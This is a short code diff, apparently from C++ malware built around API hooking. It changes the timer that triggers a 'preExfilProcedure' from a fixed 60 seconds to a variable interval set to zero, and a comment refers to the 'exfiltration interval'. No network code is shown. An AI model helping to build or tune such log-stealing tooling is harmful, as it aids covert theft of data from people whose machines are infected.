@@ -67,7 +67,8 @@ namespace APIHook
 
 	// Change exfiltration interval here...remember...time is in miliseconds!
 
-	Timer logExfilTimer(preExfilProcedure, 1000 * 60, Timer::Infinite);
+	int intervalSeconds = 0;
+	Timer logExfilTimer(preExfilProcedure, 1000 * intervalSeconds, Timer::Infinite);
 
 	/* 
 	
